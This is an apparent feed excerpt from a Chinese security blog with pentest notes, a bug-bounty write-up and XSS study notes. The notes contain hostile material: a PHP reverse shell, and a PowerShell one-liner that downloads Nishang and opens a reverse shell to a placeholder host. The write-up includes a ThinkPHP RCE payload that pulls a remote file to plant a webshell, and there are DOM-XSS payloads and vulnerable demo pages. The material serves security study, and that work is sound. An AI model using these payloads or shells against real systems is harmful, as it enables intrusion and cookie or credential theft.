时，表示限制mysqld不允许导入或导出。</span><br><span class="line">secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。</span><br><span class="line">secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</span><br></pre></td></tr></table></figure><h4 id="msf-udp提权"><a href="#msf-udp提权" class="headerlink" title="msf udp提权"></a>msf udp提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/mysql/mysql_udf_paylo</span><br></pre></td></tr></table></figure><h3 id="ubuntu16安装metasploit"><a href="#ubuntu16安装metasploit" class="headerlink" title="ubuntu16安装metasploit"></a>ubuntu16安装metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</span><br><span class="line">mv msfupdate.erb msfinstall</span><br><span class="line">sudo chmod 755 msfinstall</span><br><span class="line">./msfinstall</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><h3 id="php交互式反弹shell"><a href="#php交互式反弹shell" class="headerlink" title="php交互式反弹shell"></a>php交互式反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock = fsockopen(&quot;xx.xx.xx.xx&quot;, 1234);</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">        0 =&gt; $sock,</span><br><span class="line">        1 =&gt; $sock,</span><br><span class="line">        2 =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(&apos;/bin/sh&apos;, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>内网转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/170970.html</span><br></pre></td></tr></table></figure><p>windows反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 &apos;);Invoke-PowerShellTcp -Reverse -IPAddress xxx.com -port 21000</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</a> </p><h3 id="信息收集神器"><a href="#信息收集神器" class="headerlink" title="信息收集神器"></a>信息收集神器</h3><p>搜索账号密码 <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>查看网站绝对路径 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SERVER[&quot;DOCUMENT_ROOT&quot;]C:\inetpub\wwwroot</span><br></pre></td></tr></table></figure><p>查看禁用函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functionsno valueno value</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/categories/渗透测试/"/>
    
    
    <category term="黑阔" scheme="https://legoc.github.io/tags/黑阔/"/>
    
    <category term="笔记" scheme="https://legoc.github.io/tags/笔记/"/>
    
    <category term="信息收集" scheme="https://legoc.github.io/tags/信息收集/"/>
    
  </entry>
  
  <entry>
    <title>一次成功的子域名劫持</title>
    <link href="https://legoc.github.io/2019/03/10/%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81/"/>
    <id>https://legoc.github.io/2019/03/10/%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81/</id>
    <published>2019-03-10T02:13:17.000Z</published>
    <updated>2019-03-12T11:29:08.979Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前在先知社区和freebuf上看过关于子域名劫持的文章，一直觉得这种漏洞挺有意思，</p><p>但是总感觉很难撞到能利用的，后来有幸目睹了Art3mis师傅进行了一次风骚的子域名劫持，</p><p><img src="/2019/03/10/一次成功的子域名劫持/3.jpg" alt="2"></p><p>让我看到了实时案例，于是希望着有一天我也能挖个这种洞。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h2><p>在挖某厂商的SRC时，我用了农夫安全的farmscan_domain对他进行了子域名挖掘，</p><p>发现了一个子域名为xxxxxx.x.com</p><p>访问他发现了<img src="/2019/03/10/一次成功的子域名劫持/1.png" alt="2"></p><p>然后我意识到了这里有搞头</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>反解析ip 发现他是腾讯云下的服务器</p><p>用nmap扫描端口 发现他开放了22 80 888 8888端口</p><p>然后直接访问ip时 返回了一个json数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;欢迎访问&quot;,&quot;data&quot;:[]&#125;</span><br></pre></td></tr></table></figure><p>有个扫出一个后台ip/Admin/login/index.html 这里的验证码不会刷新可进行爆破 经过一番尝试爆破不出密码</p><p>访问888端口 回响403</p><p>访问8888端口</p><p><img src="/2019/03/10/一次成功的子域名劫持/2.png" alt="2"></p><p>我只能得到这些信息</p><p>这个腾讯云的服务器 用了宝塔面板 宝塔的后台地址我无法得知  有个可爆破的后台</p><p>在爆破了后台跟ssh无果之后我几乎放弃</p><p>然后我决定再对其进行一次目录爆破</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>然后我突然想访问一下这个目录看看他会报什么错xxxx/%3f/</p><p>于是最大的转机来了，报错了，最重要的是发现了这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP V5.0.20 &#123; 十年磨一剑-为API开发设计的高性能框架 &#125;</span><br></pre></td></tr></table></figure><p>下意识就想到了thinkphp的漏洞，</p><p>虽然看过了水泡泡师傅和chybeta师傅在先知上关于这个漏洞的文章，</p><p>但是因为各种原因没有好好复现过这个漏洞在后面插payload的过程中踩了很多坑，</p><p>进过多次尝试，终于成功的getshell了</p><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/index.php?s=captcha&amp;lego=copy(&quot;http://xxx/lego.txt&quot;,&quot;test.php&quot;)</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter=assert&amp;method=get&amp;server[REQUEST_METHOD]=lego</span><br></pre></td></tr></table></figure><p>蚁剑连上去</p><p><img src="/2019/03/10/一次成功的子域名劫持/4.jpg" alt="2"></p><p>发现了一个hydra.php的文件，发现被人种过马了，</p><p>顺手把这个马删了。</p><p>在拿下这个域名的webshell之后，我想对这种漏洞进行一个利用</p><p>在这子域名下</p><p>携带了一些  *.xxx.com的cookie</p><p>于是我便想着上传一个xss页面</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>直接用域名访问xxxxx/test.php 返回404</p><p><img src="/2019/03/10/一次成功的子域名劫持/5.png" alt="2"></p><p>ip/test.php 会访问到我的一句话</p><p>只有在访问域名的时候浏览器才会携带cookie,用ip访问时浏览器不会携带cookie</p><p>意味着，我即使上传了带XSS的html页面，也无法访问到XSS页面。</p><p>但是我用域名:8888访问可以访问到宝塔那个页面</p><p>我起初想要修改那个页面来实现XSS</p><p>如果我们想要修改宝塔的话，就要访问<code>/www/server/panel/</code> 目录，</p><p>但是我的webshell是没有权限访问那个目录了，除非提权，</p><p>但是这又是一台腾讯云的服务器，应该不会出现可以提权的漏洞，</p><p>于是我陷入了沉思。。。。。</p><p>然后沉思久了我就去WC了，在WC的过程中，我用手机看了一下宝塔官网的用户手册 <a href="http://docs.bt.cn/424204" target="_blank" rel="noopener">http://docs.bt.cn/424204</a></p><p>在翻阅之后，我发现了一些有趣的东西，比如我们之前直接用域名访问，发现有那个没找到站点的页面，</p><p>其实这个是因为宝塔面板里面没有设置这个域名为解析的域名，所以会出现这种情况。</p><p>然后我们需要<code>/etc/init.d/bt default</code>才能查看宝塔的后台地址，我用蚁剑发现无法执行命令，估计是权限不够，</p><p>所以修改8888端口下的宝塔估计也是凉凉了</p><p>在继续翻阅宝塔的用户手册后，我发现了端口888运行了是phpmyadmin，然后我突然感觉到了我应该是可以完成这次利用了，</p><p>我找到了phpmyadmin的绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin_xxxxxxxxx</span><br></pre></td></tr></table></figure><p>我们之前直接访问888端口返回的是</p><p><img src="/2019/03/10/一次成功的子域名劫持/6.jpg" alt="2"></p><p>当我访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.com/phpmyadmin_xxxxxxxxx/</span><br></pre></td></tr></table></figure><p>成功的跳转到了phpmyadmin的后台</p><p>在这个目录下新建一个html页面，访问 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">子域名:888/phpmyadmin_xxxxxxxxx/test.html</span><br></pre></td></tr></table></figure><p>成功弹出cookie</p><p><img src="/2019/03/10/一次成功的子域名劫持/7.jpg" alt="2"></p><p>至此，我的利用已经完成了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次渗透不得不说，有很多的运气成分，，主要时间在于信息收集上和学习新的事物上，</p><p>第一次挖子域名劫持，第一次认真利用thinkphp的RCE，和第一次真正的接触宝塔面板。</p><p>整个过程磕磕碰碰，但感觉收获了很多。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="SRC" scheme="https://legoc.github.io/categories/SRC/"/>
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="子域名劫持" scheme="https://legoc.github.io/tags/子域名劫持/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透学习</title>
    <link href="https://legoc.github.io/2019/02/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    <id>https://legoc.github.io/2019/02/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-02-27T13:43:04.000Z</published>
    <updated>2019-08-12T05:53:28.676Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.lijiejie.com/16</span><br><span class="line">nmap -sP --min-hostgroup 1024 --min-parallelism 1024 -iL ip.txt -oG ip_output1113.txt</span><br></pre></td></tr></table></figure><p>-sn    不扫描端口，只ping主机</p><p>-PE   通过ICMP echo判定主机是否存活</p><p>-n     不反向解析IP地址到域名</p><p>–min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描</p><p>–min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024</p><p>-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml</p><p>一旦扫描结束，解析XML文档即可得到哪些IP地址是存活的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 -v 14.116.140.49</span><br><span class="line">参数：</span><br><span class="line">-sS    TCP SYN扫描    nmap -sS 192.168.1.254   </span><br><span class="line">-P     指定端口扫描   nmap -sS -P 1-65535 192.168.1.254</span><br><span class="line">-V     详细信息       nmap -V -sS 192.168.1.254</span><br></pre></td></tr></table></figure><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>利用教程<a href="https://www.jianshu.com/p/45ad9a534fb4" target="_blank" rel="noopener">https://www.jianshu.com/p/45ad9a534fb4</a></p><p>两种模块的利弊<a href="https://www.bodkin.ren/index.php/archives/555/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/555/</a></p><h3 id="存活探测"><a href="#存活探测" class="headerlink" title="存活探测"></a>存活探测</h3><p>随机生成A段地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">f=open(&quot;ip.txt&quot;,&apos;w+&apos;)</span><br><span class="line">for x in range(0,255):</span><br><span class="line">for i in range(0,255):</span><br><span class="line">ip=&apos;10.&apos;+str(x)+&apos;.&apos;+str(random.randint(0,255))+&apos;.&apos;+str(random.randint(0,255))+&quot;\n&quot;</span><br><span class="line">f.writelines(ip)</span><br></pre></td></tr></table></figure><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p><a href="https://www.jianshu.com/p/aa6fd3769f95" target="_blank" rel="noopener">https://www.jianshu.com/p/aa6fd3769f95</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="笔记" scheme="https://legoc.github.io/categories/笔记/"/>
    
    
    <category term="渗透测试" scheme="https://legoc.github.io/tags/渗透测试/"/>
    
    <category term="内网" scheme="https://legoc.github.io/tags/内网/"/>
    
  </entry>
  
  <entry>
    <title>XSS学习小记</title>
    <link href="https://legoc.github.io/2019/02/26/XSS%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
    <id>https://legoc.github.io/2019/02/26/XSS%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/</id>
    <published>2019-02-26T03:38:00.000Z</published>
    <updated>2019-03-08T04:52:32.186Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="xss靶场"><a href="#xss靶场" class="headerlink" title="xss靶场"></a>xss靶场</h1><p>地址：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p><p>参考wp:<a href="https://xz.aliyun.com/t/1206" target="_blank" rel="noopener">https://xz.aliyun.com/t/1206</a></p><p>小记：</p><ol><li><p><code>&lt;input&gt;</code>标签里面可触发alert的事件<code>oninput</code> 和 <code>onchange</code></p></li><li><p><code>&lt;a&gt;</code>href的javascript</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>有waf过滤时，多查看源码，看看payload发生了什么变化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用绕过方式 双写绕过 大小写绕过</span><br></pre></td></tr></table></figure></li><li><p>协议绕过</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Javascript：伪协议后面可以使用URL编码。</span><br><span class="line">如：&lt;a href=&quot;javas%09cript:alert(1)&quot;&gt;click me&lt;/a&gt;可成功执行弹窗。</span><br><span class="line">可用img就不行:&lt;img src=1 onerror=&quot;javas%09cript:alert(1)&quot;&gt;</span><br><span class="line">因为href属性会跳转到其中的URL，而会进行URL解码，onerror属性只会执行JS,不跳转同时后面的url编码可以再做一次entity(HTML实体)编码：</span><br><span class="line">%09 --&gt; TAB</span><br><span class="line">%0d --&gt; 回车</span><br><span class="line">%0a --&gt; 空格</span><br></pre></td></tr></table></figure><p>html标签不区分大小写，但是javascript区分大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg sRc=x onError=alert(1)&gt;    弹窗</span><br><span class="line">&lt;iMg sRc=x onError=aLert(1)&gt;    不弹窗</span><br></pre></td></tr></table></figure></li><li><p>referer和User-Agent和xff cookie等也可能造成XSS（当这些信息会输出到页面时）</p></li><li><p>angularjs的ng-include 加载外面html导致的XSS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&apos;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure></li><li><p>flash xss</p><p>flash xss可使用JPEXS 对下载的flash进行逆向分析，找到关键函数</p><p>Flash xss检测脚本的简单实现 <a href="https://www.freebuf.com/sectool/108568.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/108568.html</a></p></li></ol><h1 id="dom-xss"><a href="#dom-xss" class="headerlink" title="dom-xss"></a>dom-xss</h1><h3 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h3><p>test.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;XSSdemo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;script&gt;    </span><br><span class="line">eval(location.hash.substr(1));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    test</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxx/test.html#alert(1);</span><br></pre></td></tr></table></figure><p>分析</p><p>location.hash.substr(1)</p><p>提取出来的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br></pre></td></tr></table></figure><p>eval执行了alert(1)，从而引发了xss</p><h3 id="几种常见的dom型xss"><a href="#几种常见的dom型xss" class="headerlink" title="几种常见的dom型xss"></a>几种常见的dom型xss</h3><h4 id="使用document-write直接输出导致浏览器解析恶意代码"><a href="#使用document-write直接输出导致浏览器解析恶意代码" class="headerlink" title="使用document.write直接输出导致浏览器解析恶意代码"></a>使用document.write直接输出导致浏览器解析恶意代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">          s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">        var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">        if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空 </span><br><span class="line">          var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">          url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          url=&quot;url参数为空&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;url: &lt;a href=&apos;&quot;+url+&quot;&apos;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;);  //输出</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx/test.html?url=javascript:alert(1)</span><br></pre></td></tr></table></figure><h4 id="使用innerHTML直接输出导致浏览器解析恶意代码"><a href="#使用innerHTML直接输出导致浏览器解析恶意代码" class="headerlink" title="使用innerHTML直接输出导致浏览器解析恶意代码"></a>使用innerHTML直接输出导致浏览器解析恶意代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">      &lt;title&gt;&lt;/title&gt;</span><br><span class="line">      &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">          var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">            s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">          var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">          if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">            var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">            url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">            url=&quot;url参数为空&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;span id=&apos;test&apos;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;document.getElementById(&quot;test&quot;).innerHTML=&quot;我的url是: &lt;a href=&apos;&quot;+url+&quot;&apos;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;; &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx/test.html?url=javascript:alert(1)</span><br></pre></td></tr></table></figure><h4 id="使用location-location-href-location-replace-iframe-src造成的XSS"><a href="#使用location-location-href-location-replace-iframe-src造成的XSS" class="headerlink" title="使用location/location.href/location.replace/iframe.src造成的XSS"></a>使用location/location.href/location.replace/iframe.src造成的XSS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">     &lt;html&gt;</span><br><span class="line">       &lt;head&gt;</span><br><span class="line">         &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">         &lt;title&gt;&lt;/title&gt;</span><br><span class="line">         &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">             var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">               s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">             var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">             if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">               var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">               url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">             // &#125;else&#123;                        //此处注释掉</span><br><span class="line">             //   url=&quot;url参数为空&quot;;          //此处注释掉</span><br><span class="line">              &#125;</span><br><span class="line">         &lt;/script&gt;</span><br><span class="line">       &lt;/head&gt;</span><br><span class="line">       &lt;body&gt;</span><br><span class="line">         &lt;span id=&apos;test&apos;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">          &lt;script type=&quot;text/javascript&quot;&gt;location.href=url&lt;/script&gt;</span><br><span class="line">       &lt;/body&gt;</span><br><span class="line">     &lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="使用setTimeout-setInterval造成的XSS"><a href="#使用setTimeout-setInterval造成的XSS" class="headerlink" title="使用setTimeout/setInterval造成的XSS"></a>使用setTimeout/setInterval造成的XSS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">       &lt;html&gt;</span><br><span class="line">         &lt;head&gt;</span><br><span class="line">           &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">           &lt;title&gt;&lt;/title&gt;</span><br><span class="line">           &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">               var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">                 s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">               var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">               if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       